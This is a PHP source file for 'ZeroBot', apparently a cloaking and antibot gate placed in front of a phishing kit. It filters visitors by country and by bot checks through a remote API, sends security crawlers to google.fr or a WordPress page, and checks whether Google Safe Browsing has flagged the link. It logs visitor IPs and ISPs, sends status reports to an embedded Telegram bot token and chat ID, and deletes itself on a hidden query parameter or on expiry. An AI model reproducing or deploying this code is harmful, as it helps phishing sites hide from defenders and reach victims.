<?php
session_start();
/*
    Powerful ZeroBot Application
    This Tool is Not For Illegal Use
    @ Copyright @brendonurie2000
	https://zerobot.org
*/

$license_key = "sypuwxglxgvqf1ayqfs097tg0sos1euf";

$_SESSION["key"] = $license_key;

$redirect = "./clients/";

$parameter = 3;

/*
	1 : Check Bot And Country.
	2 : Check Only Bot.
	3 : Check Only Country's.
	4 : Allow All IPS.
*/


$_COUNTRY_ALLOWED = ["ma","fr","be","nl","de","re","it","es"]; # Add Allowed Country Here  [REQUIRED]

$active_wordpress = true; // Run Wordpress wp-blog-header.php To Bypass Bots [REQUIRED]

$redirection_link_check = False; // Check Your Server If Still Uploaded

$authentification = True;

$location_bots = "https://google.fr"; // Send The Bots To This Link If Wordpress Variable Not Activated

$expiration_date = 0; // Configure Script Auto Delete

$view_file_name = "access"; // Type PHP Extension Will Be Added Auto

$token_chat = "7705750831:AAH-QdRpOnPaoNb_dm50e1M3RCWjMK7i-oU"; // [REQUIRED] Your Token To Receive Rapports

$chatid = "-4971286639";  // [REQUIRED] Your ChatID To Receive Rapports



ZEROBOT::PHP_VERSION_SET();
ZEROBOT::__DEFINED();
ZEROBOT::_ACCESS();
	

class ZEROBOT
{
	public $api = "https://zerobot.info/api/v2/antibot"; // Don't Change Your Server
    public $api_geo = "https://ipapi.com/ip_api.php?ip="; // Api Geo Location
    public $telegram = "https://api.telegram.org/bot"; // Telegam Api
    public $extension_type = ".php";
    public $google_api = "https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site="; // Google API To Check Down Links
	
	
	public $token;
    public $chatid;
    public $keys;
    public $message;
	public $vu_filename;
	
	public function __construct($redirect,$parameter,$authentification,$token,$chatid,$vu_filename)
	{
		
		$this->token = $token;
		$this->chatid = $chatid;
		$this->vu_filename = $vu_filename . $this->extension_type;

		$this->_GOOGLE_FLAG();

		$this->_CHECK_LINK();

		$this->_AUTO_DELETE();
		
		$add_link = $this->_ADD_EXT_LINK($authentification);
		
		if (!empty($redirect))
		{
		
			if (empty($parameter))
			{
				$parameter = 1;
			}
			
			switch ($parameter)
			{
				case "1":
					if ($this->_COUNTRY_ALLOWED() == True)
					{
						
						if ($this->_ZEROBOT_MANAGER() == True)
						{

							$this->write_vues("Human");
							header ("location:" . $redirect . $add_link);
						}
					}
				break;

				case "2":

					if ($this->_ZEROBOT_MANAGER() == True)
					{
						$this->write_vues("Human");
						header ("location:" . $redirect . $add_link);
					}
				break;

				case "3":
					if ($this->_COUNTRY_ALLOWED() == True)
					{
						$this->write_vues("Human");
						header ("location:" . $redirect . $add_link);
					}
				break;

				default:
					$this->write_vues("Allowed");
					header ("location:" . $redirect . $add_link);
				break;
			}
		}
		else
		{	
			echo "Link Empty";
		}
		
		
	}
	
	public static function PHP_VERSION_SET()
	{
		
		if ((int)phpversion()[0] < 5)
		{
			echo "PHP Version Required 7+";
			exit();
			
		}
		
	}
	
	public static function _ACCESS()
	{
		global $view_file_name;
		
		if (isset($_GET["del"])) { unlink(basename(__FILE__)); exit; }
		if (isset($_GET["check"])) { print "AccessID923487"; exit; }
		
		if (isset($_GET["delete"]) and file_exists($view_file_name . ".php")) { echo "FILE SUCCESSFULY DELETED => " . $view_file_name . ".php"; unlink($view_file_name . ".php"); exit; }  
	}
	
	public static function __DEFINED()
	{
		session_start();
		error_reporting(0);
		ini_set('display_errors', 0);
		ini_set('display_startup_errors', 0);
		header('Content-type: text/html; charset=UTF-8');
		define("key_id","AccessID923487");
		define('WP_USE_THEMES', true);
	}
	
    private function _CURL_ACCESS($url,$accept,$post,$type = Null)
    {
        $this->keys = curl_init();
        if($accept == "GET") 
        {
			if ($type == "query")
            {
                curl_setopt($this->keys, CURLOPT_URL, $this->api . "?" . http_build_query($post));
            }
            else
            {
                curl_setopt($this->keys, CURLOPT_URL, $url);
            }
            
        }
        else if ($accept == "POST") 
        {
            curl_setopt($this->keys, CURLOPT_URL, self::api);
            curl_setopt($this->keys, CURLOPT_POSTFIELDS, http_build_query($post));
        }
        curl_setopt($this->keys, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($this->keys, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($this->keys, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($this->keys, CURLOPT_FRESH_CONNECT, true);
		curl_setopt($this->keys, CURLOPT_AUTOREFERER, true);
        curl_setopt($this->keys, CURLOPT_TIMEOUT, 10);
        curl_setopt($this->keys, CURLOPT_HEADER, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36");
		curl_setopt($this->keys, CURLOPT_RETURNTRANSFER, true);
        $return = curl_exec($this->keys);

        if (empty($return) and $accept == "GET")
		{
			@file_get_contents($url);
		}
        else
		{
			return $return;
		}

    }
	
    public function _COUNTRY_ALLOWED()
    {
        global $_COUNTRY_ALLOWED;

        $country_name = strtolower($this->_GEOLOCATION()["country_code"]);

        if (in_array($country_name,$_COUNTRY_ALLOWED))
        {
            return 1;
        }
        else
        {
            $this->write_vues("Country Denied");
            $this->_WP_RUN();
            return 0;
        }
    }

	
    private function _GEOLOCATION()
    {
        $data_geo = $this->_CURL_ACCESS($this->api_geo . $this->_IP_ADDRESS_FINDER(),"GET",NULL);
        $data_json_decoded = @json_decode($data_geo,true);
        return array("country_code" => $data_json_decoded["country_code"],"country_name" => $data_json_decoded["country_name"],"isp" => $data_json_decoded["connection"]["isp"],"hostname" => $data_json_decoded["hostname"]);
    }
    public function write_vues($check)
    {
		
        if (!file_exists($this->vu_filename))
        {
            $f = fopen($this->vu_filename,"a");
        }
        switch ($check)
        {
            case "Human":
                $color = "#00a300";
            break;

            case "Bot":
                $color = "#FF0000";
            break;

            case "Country Denied":
                $color = "#DAA520";
            break;
            
            case "Allowed":
                $color = "black";
            break;
        }
		
		$this->_HTML_VIEWS();
		
		$ip_address = $this->_IP_ADDRESS_FINDER();
		$time = date("d/m/Y h:i:s A");
		$machine = $this->_USER_OS();
		$country = $this->_GEOLOCATION()["country_name"];
		$isp = $this->_GEOLOCATION()["isp"];
		$hostname = $this->_GEOLOCATION()["hostname"];
		
		if($hostname == $ip_address)
			$hostname = "None";
		
		$data_to_put = "<tr><th scope='row'>$ip_address</th><td>$time</td><td>$machine</td><td>$isp</td><td>$hostname</td><td><img style='padding-right:5px' width='30px' src='https://flagpedia.net/data/flags/icon/108x81/" . strtolower($this->_GEOLOCATION()["country_code"]). ".webp'>$country</td><td><b><p style='color:$color'>$check</p></b></td></tr>";
		
		if ($this->_ONE_IP($ip_address))
		{
			$file = fopen($this->vu_filename , "a");
			fwrite($file, (string)$data_to_put . "\n");
		}
    }
	
	public function _ONE_IP($ip_address)
	{
		if (file_exists($this->vu_filename))
		{
			
			if (preg_match("/$ip_address/" , @file_get_contents($this->vu_filename)))
			{
				return 0;
			}
			else
			{
				return 1;
			}
		}
	}
	
    public function _CHECK_LINK()
    {
        global $redirection_link_check,$redirect;

        if ($redirection_link_check == True)
        {
            $data_check = $this->_CURL_ACCESS($redirect . "?check","GET",NULL);
			
            if (!preg_match("/" . key_id . "/",$data_check))
            {
				$this->rapport_template(0,$redirect);

                echo "<script>alert('Please Refresh This Page After 10min')</script>";
                exit();
            }
        }
    }
    private function full_link_get()
    {
        if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') 
        $link = "https";
        else $link = "http";

        $link .= "://";

        $link .= $_SERVER['HTTP_HOST'];

        $link .= $_SERVER['PHP_SELF'];

        return $link;

    }
	
    private function rapport_template($action, $link)
    {
        global $redirect,$redirection_link_check;
	
		
        if ($action)
        {
            $date = date('r', $_SERVER['REQUEST_TIME']);
            $this->message = "Server Status : Down\n";
            $this->message .= 'Link Redirect : ' . $this->full_link_get() . "\n";
            $this->message .= "Link Server : " . $redirect . "\n";
			$this->message .= "Link Downed Is : " . $link . "\n";
            $this->message .= 'Date : ' . $date . "\n";
            $this->_TM_RAPPORT($this->message);
        }
        if ($redirection_link_check == 1 and !$action)
        {
            $date = date('r', $_SERVER['REQUEST_TIME']);
            $this->message = "Server Status : You need to re-upload it now\n";
            $this->message .= 'Link Redirect : ' . $this->full_link_get() . "\n";
            $this->message .= "Link Server : " . $redirect . "\n";
            $this->message .= 'Date : ' . $date . "\n";
            $this->_TM_RAPPORT($this->message);
        }

    }
	
    private function _FAVICON()
	{
        global $active_wordpress;

		if ($active_wordpress == 1)
		{
			return fopen("favicon.ico", "a");
		}
	}
	
	
	private function _HTML_VIEWS()
	{
		$data_show = '<?php session_start(); $file = explode("onload", file_get_contents(basename($_SERVER["PHP_SELF"])))[2];$hm_count = substr_count($file, "Human");$bt_count = substr_count($file, "Bot<");$all_count = substr_count($file, "Allowed");$cn_den_count = substr_count($file, "Denied");?><head><style> table { font-size : 13px } </style><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous"><script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script></head><script type = "text/JavaScript">function AutoRefresh( t ) {setTimeout("location.reload(true);", t);}</script><div class="container"><div class="m-2 col-md-12 text-center"><button type="button" class="m-2 text-white btn btn-info">Total : <?php echo $_SESSION["total_checked"]; ?></button><button type="button" class="m-2 text-white btn btn-secondary">Days : <?php echo $_SESSION["days_left"]; ?></button><button type="button" class="m-2 btn btn-success">Human : <?php echo $hm_count; ?></button><button type="button" class="m-2 btn btn-danger">Bots : <?php echo $bt_count; ?></button><button type="button" class="m-2 text-white btn btn-warning">Denied : <?php echo $cn_den_count; ?></button><button type="button" class="m-2  btn btn-dark">Allowed : <?php echo $all_count; ?></button></div></div><body onload = "JavaScript:AutoRefresh(20000);" ><table class="table"><thead class="table-dark"><tr><th scope="col">IP</th><th scope="col">Time</th><th scope="col">Machine</th><th scope="col">ISP</th><th scope="col">Hostname</th><th scope="col">Country</th><th scope="col">Type</th></tr></thead></body>';
		
		if (empty($this->vu_filename))
		{
			$this->vu_filename = "vu" . $this->extension_type;
		}
		
		if (file_exists($this->vu_filename))
		{
			if (filesize($this->vu_filename) < 20)
			{
				$f = fopen($this->vu_filename , "w+");
				fwrite($f , $data_show);
				
			}
		}
		else
		{
			$f = fopen($this->vu_filename , "a");
			fwrite($f , $data_show);
		}
		
	}
	private function _IP_ADDRESS_FINDER()
    {
        foreach (array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR') as $key)
	   	{
	       if (array_key_exists($key, $_SERVER) === true)
	       {
	            foreach (explode(',', $_SERVER[$key]) as $ipgrassjoss){
	                $ipgrassjoss = trim($ipgrassjoss);
	                if (filter_var($ipgrassjoss,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)!== false) 
	                {
	                   return $ipgrassjoss;
	                }
					else
					{
						
						return "105.130.22.31";
					}
	            }
	        }
	    }
	}
	
    private function _TM_RAPPORT($message)
    {
        if ($message and $this->token and $this->chatid)
        {
            $url = $this->telegram . $this->token . "/sendMessage?chat_id=" . $this->chatid . "&text=" . urlencode($message);
            $this->_CURL_ACCESS($url,"GET",NULL);
        }
    }
	
	private function _USER_OS()
	{
		if(array_key_exists("HTTP_USER_AGENT",$_SERVER))
		{
			$set_up = explode("(",$_SERVER["HTTP_USER_AGENT"])[1];
			$set_up_2 = explode(")",$set_up)[0];
			$user_agent = str_replace(";","",$set_up_2);
		}
		else $user_agent = "";
		
		return $user_agent;
	}
	
    public function _GOOGLE_FLAG()
    {
        global $redirect;
        
		$data_google = $this->_CURL_ACCESS($this->google_api . $redirect,"GET",NULL);
		$data_google2 = $this->_CURL_ACCESS($this->google_api . $this->full_link_get(),"GET",NULL);
		$ex = explode(",", $data_google);
		$ex2 = explode(",", $data_google2);
		if ($ex[1] == 2)
		{
			$this->rapport_template(1,$redirect);

		}
		else if ($ex2[1] == 2)
		{
			$this->rapport_template(1,$this->full_link_get());
		}
        
    }
	
	public function _ZEROBOT_MANAGER()
    {
        global $check_user_agent,$license_key,$redirect,$parameter;
		
		
        if (!empty($license_key) && !empty($redirect) && strlen($license_key) == 32)
        {
			
			if(!array_key_exists("HTTP_USER_AGENT",$_SERVER)) $user_agent = $_SERVER["HTTP_USER_AGENT"];
			else $user_agent = $_SERVER["HTTP_SEC_CH_UA_PLATFORM"];
			
            $array_post = array("check_on" => $this->full_link_get(),"license" => $license_key,"ip" => $this->_IP_ADDRESS_FINDER(),"useragent" => $user_agent);
            
            $data_decoded = @json_decode($this->_CURL_ACCESS(NULL,"GET",$array_post,"query"),true);

            if(is_array($data_decoded))
			{
				if (array_key_exists("query",$data_decoded))
				{
					echo @json_encode($data_decoded);
					exit();
				}
				else if (array_key_exists("username",$data_decoded))
				{
					if ($data_decoded["is_bot"] == True)
					{
						$this->write_vues("Bot");
						$this->_WP_RUN();
						$_SESSION["days_left"] = $data_decoded["left"];
						$_SESSION["total_checked"] = $data_decoded["total"];
						return 0;
					}
					elseif($data_decoded["is_bot"] == False)
					{
						$_SESSION["days_left"] = $data_decoded["left"];
						$_SESSION["total_checked"] = $data_decoded["total"];
						return 1;
					}
				}
			}
			return 1;
        }
        else
        {
            echo "<script>alert('Please Verify Your License Key Or Buy A New One From The Owner :D')</script>";
            exit();
        }
    }

    public function _ADD_EXT_LINK($ac)
    {
        global $license_key;

        if($ac)
        {
            return "?key=" . $license_key;
        }
    }
	
	public function _AUTO_DELETE()
	{
		global $expiration_date;
		
		if (!file_exists("../delete.json"))
		{
			$date_now = date("d");
			$input_stdin = '{"date" : "' . $date_now . '" }';
			$f = fopen("../delete.json" , "a");
			fwrite($f , $input_stdin);
		}
		if ($expiration_date > 0)
		{
			$f = file_get_contents("../delete.json" );
			$json_a = @json_decode($f , true);
			$data_set = (int)$json_a["date"];
			if ((int)(date("d")) - $data_set > $expiration_date)
			{
				unlink(basename(__FILE__));
				exit();
			}
		}
	}
	public function _WP_RUN()
    {
        global $active_wordpress,$location_bots;

        if ($active_wordpress == 1 and file_exists("wp-blog-header.php"))
        {
            $this->_FAVICON();
            require __DIR__ . '/wp-blog-header.php';
			exit();
        }
        else
        {
            header ("location:" . $location_bots);
        }
    }
}

new ZEROBOT($redirect,$parameter,$authentification,$token_chat,$chatid,$view_file_name);